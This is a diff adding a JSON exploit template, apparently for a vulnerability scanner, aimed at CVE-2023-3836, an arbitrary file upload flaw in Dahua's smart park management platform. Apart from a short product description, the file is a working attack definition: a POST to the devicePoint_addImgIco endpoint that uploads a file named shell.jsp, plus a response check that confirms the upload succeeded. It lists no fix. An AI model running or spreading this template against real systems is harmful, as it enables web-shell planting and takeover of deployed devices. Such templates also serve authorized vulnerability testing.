@@ -1,0 +1,42 @@
+{
+  "product": "大华智慧园区综合管理平台",
+  "vul_name": "大华智慧园区综合管理平台 devicePoint_addImgIco 任意文件上传",
+  "type": "文件上传",
+  "vul_id": [
+    "CVE-2023-3836"
+  ],
+  "level": 3,
+  "vul_desc": "大华智慧园区综合管理平台是由大华技术股份有限公司（Dahua Technology）开发的一款综合管理解决方案。该平台旨在帮助园区管理者提高管理效率、提升安全水平、优化资源利用，并实现智能化的园区运营。大华智慧园区综合管理平台采用模块化设计和开放式架构，可根据不同园区的需求进行定制和扩展。同时，它还支持云端部署和移动端访问，方便管理者随时随地监控园区运营情况。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "https://blog.csdn.net/weixin_44304678/article/details/134166905"
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/weixin_44304678/article/details/134166905",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/emap/devicePoint_addImgIco?hasSubsystem=true",
+      "file": {
+        "upload": [
+          "shell.jsp",
+          "",
+          "application/octet-stream"
+        ]
+      }
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "\"code\":1"
+        }
+      ]
+    }
+  }
+}
